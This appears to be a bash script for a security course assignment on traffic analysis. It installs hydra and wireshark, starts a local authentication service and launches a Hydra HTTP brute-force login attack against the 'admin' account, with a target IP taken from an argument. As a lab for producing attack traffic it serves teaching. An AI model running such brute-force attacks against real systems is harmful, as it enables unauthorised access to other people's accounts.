#!/bin/bash
# Assignment 06: Threat Detection & Incident Response (Traffic Analysis)

TARGET_IP=${1:-"127.0.0.1"}
PORT=${2:-"8080"}

for pkg in python3 hydra wireshark; do
    if ! command -v $pkg &> /dev/null; then
        sudo apt update && sudo apt install -y $pkg
    fi
done

python3 auth_service.py &
SERVER_PID=$!
sleep 1

echo "[*] Target Service running on $TARGET_IP:$PORT (PID: $SERVER_PID)"
echo "[*] Launching Hydra HTTP brute-force attack..."
hydra -l admin -P wordlist.txt -s "$PORT" "$TARGET_IP" http-get /

kill $SERVER_PID 2>/dev/null || true
